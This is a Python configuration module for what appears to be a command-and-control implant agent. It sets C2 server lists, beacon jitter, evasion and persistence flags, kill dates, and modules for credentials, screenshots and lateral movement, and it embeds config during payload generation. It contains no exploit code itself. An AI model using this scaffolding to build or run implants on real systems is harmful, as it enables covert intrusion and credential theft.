# agent/core/config.py
import os
import json
import base64
from typing import Dict, Any, List, Optional
from dataclasses import dataclass, field


@dataclass
class AgentConfig:
    """Agent configuration"""
    
    # C2 Server settings
    c2_servers: List[str] = field(default_factory=lambda: ["http://localhost:8000"])
    backup_servers: List[str] = field(default_factory=list)
    
    # Communication settings
    protocol: str = "https"
    checkin_interval: int = 60  # seconds
    checkin_jitter: float = 0.2  # 20% jitter
    max_retries: int = 3
    retry_delay: int = 5
    
    # Encryption settings
    encryption_enabled: bool = True
    encryption_key: str = ""
    
    # Agent behavior
    enable_persistence: bool = False
    enable_evasion: bool = True
    kill_date: Optional[str] = None  # ISO format date
    working_hours: Optional[Dict[str, str]] = None  # {"start": "09:00", "end": "17:00"}
    
    # Proxy settings
    use_proxy: bool = False
    proxy_url: Optional[str] = None
    proxy_auth: Optional[Dict[str, str]] = None
    
    # Module settings
    enabled_modules: List[str] = field(default_factory=lambda: [
        "basic", "files", "processes", "network", 
        "persistence", "credentials", "screenshot", "lateral"
    ])
    
    # Debug settings
    debug: bool = False
    log_file: Optional[str] = None
    
    # Version
    version: str = "1.0.0"
    
    @classmethod
    def from_file(cls, filepath: str) -> 'AgentConfig':
        """Load configuration from file"""
        with open(filepath, 'r') as f:
            data = json.load(f)
        return cls(**data)
    
    @classmethod
    def from_embedded(cls) -> 'AgentConfig':
        """Load configuration from embedded string"""
        # This would be replaced during payload generation
        config_data = "{{CONFIG_DATA}}"
        
        if config_data == "{{CONFIG_DATA}}":
            # Default development config
            return cls(
                c2_servers=["http://localhost:8000"],
                encryption_key="dev_key_12345678",
                debug=True
            )
        
        try:
            # Decode base64 embedded config
            decoded = base64.b64decode(config_data)
            data = json.loads(decoded)
            return cls(**data)
        except Exception:
            # Fallback to defaults
            return cls()
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            'c2_servers': self.c2_servers,
            'backup_servers': self.backup_servers,
            'protocol': self.protocol,
            'checkin_interval': self.checkin_interval,
            'checkin_jitter': self.checkin_jitter,
            'max_retries': self.max_retries,
            'retry_delay': self.retry_delay,
            'encryption_enabled': self.encryption_enabled,
            'encryption_key': self.encryption_key,
            'enable_persistence': self.enable_persistence,
            'enable_evasion': self.enable_evasion,
            'kill_date': self.kill_date,
            'working_hours': self.working_hours,
            'use_proxy': self.use_proxy,
            'proxy_url': self.proxy_url,
            'proxy_auth': self.proxy_auth,
            'enabled_modules': self.enabled_modules,
            'debug': self.debug,
            'log_file': self.log_file,
            'version': self.version
        }
    
    def validate(self) -> bool:
        """Validate configuration"""
        if not self.c2_servers:
            return False
        
        if self.encryption_enabled and not self.encryption_key:
            return False
        
        if self.use_proxy and not self.proxy_url:
            return False
        
        return True
    
    def should_run(self) -> bool:
        """Check if agent should run based on kill date and working hours"""
        from datetime import datetime
        
        # Check kill date
        if self.kill_date:
            kill_dt = datetime.fromisoformat(self.kill_date)
            if datetime.utcnow() > kill_dt:
                return False
        
        # Check working hours
        if self.working_hours:
            now = datetime.now()
            start_time = datetime.strptime(self.working_hours['start'], '%H:%M').time()
            end_time = datetime.strptime(self.working_hours['end'], '%H:%M').time()
            
            if not (start_time <= now.time() <= end_time):
                return False
        
        return True
